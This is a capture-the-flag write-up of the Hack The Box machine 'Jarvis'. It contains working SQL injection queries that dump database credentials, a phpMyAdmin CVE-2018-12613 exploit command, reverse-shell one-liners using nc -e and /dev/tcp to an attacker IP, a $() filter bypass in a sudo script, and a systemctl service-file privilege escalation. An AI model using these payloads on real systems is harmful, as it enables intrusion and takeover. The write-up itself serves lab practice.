+++
title = "HTB - Jarvis"
date = 2025-02-10
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.10.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 19:33 EST
Nmap scan report for 10.10.10.143
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.26 seconds
```

### Enumeration
SSH and an apache instance. Points towards web vulnerability to web shell and then late stage pivot.
Gobuster shows phpmyadmin!
Webpage of hotel site. Site runs PHP applications. 
Most links broken, but `room.php` url has cod=* syntax. We can alter values for different rooms.
In burp, we see a WAF in the response with version 2.0.3, could be responsible for fishy behavior
If we probe with a `'`, the page returns a blank room. SQLi telling
Working through the injection manually, there's a good passage 0xdf has:
```
I can work through this Injection manually. I’ll start by checking for a UNION injection. I’ll set `cod=100` (something that returns nothing), and then add the union. I’ll start with `http://10.10.10.143/room.php?cod=100 UNION SELECT 1;-- -`. When that return nothing, I’ll change the `SELECT` to `SELECT 1,2`. Then `1,2,3`. When I get to `http://10.10.10.143/room.php?cod=100 UNION SELECT 1,2,3,4,5,6,7;-- -`, parts of the page populate again:
```
When we hover over the image, it references cod=1. If we compare what we've got to a legit code 1, 5 is the photo, 2 is the title, 3 is the price, 4 is the description

The breakdown is this:
List DB - ``SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -``
Result: hotel,information_schema,mysql,performance_schema

Show Tables in mysql: ``SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='mysql' ;-- -``
Result: column_stats,columns_priv,db,event,func, general_log,gtid_slave_pos,help_category, help_keyword,help_relation,help_topic,host, index_stats,innodb_index_stats,innodb_table_stats, plugin,proc,procs_priv,proxies_priv,roles_mapping, servers,slow_log,table_stats,tables_priv,time_zone, time_zone_leap_second,time_zone_name, time_zone_transition,time_zone_transition_type,user

Show column in user: `SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='user';-- -`
Result:Host,User,Password,Select_priv,Insert_priv,Update_priv, Delete_priv,Create_priv,...

Get User/Pass: `SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -`
Result: `DBadmin` and hash `2D2B7A5E4E637B8FBA1D17F40318F277D29964D0`
This cracks to `imissyou`

Once we log in, we find version info of 4.8.0, and doing research we find CVE-2018-12613
There's a searchsploit script. Runs python2 tho so be aware. 0xdf goes into how to do it manually as well.
We can check if the script works with: `python2 50457.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou whoami`
Once we get a response, we can see if `nc` is installed on the box with: `python2 50457.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou 'which nc'`
Once we confirm, start a listener on 443 and invoke: `python2 50457.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou 'nc -e /bin/sh 10.10.14.10 443'`

We're on the box as www-data and need to migrate to a user named pepper.
Running `sudo -l`, we find we can run a simpler script. Looking at what it does, theres a cool flaw.
It has pinging functionality, but it doesn't import that into python - as that's quite difficult. Rather, it makes a system call and runs the command after filtering for bad characters. A way to bypass this is to run bash commands within `$()` to bypass the filter, and then place our shell script in a new file and execute by running the file through the program with `$(/path/to/file/file.sh)`.
move to tmp dir to have access to shit
`echo -e 'bash -i >& /dev/tcp/10.10.14.10/9001' > shell.sh`
`chmod +x shell.sh`
`sudo -u pepper /var/www/Admin-Utilities/simpler.py -p`
`$(bash /tmp/shell.sh)`

USER:`53560f2b8074c387eadc54046b477190`

### Privilege Escalation
I got a weird instance where the shell i already had was the cmdline, and the output was on the new shell i spawned. So i went to the home dir and generated a ssh key to pivot to a more secure connection. Reference Tabby for exact steps

once we're on a stable connection, we can check SUID binaries: `find / -perm -4000 -ls 2>/dev/null`
We see systemctl. NO BUENO FOR PEPPER
Good note from a comment on YT. Each user has their own version of /tmp dir. They cannot access each others all of the time. /dev/shm is accessible by anyone and is a better alternative!
0xdf on systemctl and service files:
```
A service is defined by a `.service` file. The `systemctl` is used to link it to `systemd`, and then used again to start the service. What the service does is defined by the `.service` file.

[gtfobins](https://gtfobins.github.io/gtfobins/systemctl/) has a page for `systemctl`, and it gives an example where a single command is executed and output to a file in `tmp`. I’ll modify that slightly to give me a shell.
```

use https://gtfobins.github.io/gtfobins/systemctl/
```
pepper@jarvis:/dev/shm$ TF=$(mktemp).service
pepper@jarvis:/dev/shm$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "id > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $TF
```
go to tmp dir, and move .service file to /dev/shm.
Once there, change exec start line to fit our needs: `ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.10 443'` (vi instead of vim, and youve gotta delete by escaping first, then hitting d once and the arrow key once)
then, run `systemctl link /dev/shm/tmp.DTm0kYh7nR.service` make sure to add full path!
start listener on whatever
then run `systemctl enable --now /dev/shm/tmp.DTm0kYh7nR.service`
ROOT:`12d2e6cb99889bdcfb689cb1c806d2ba`
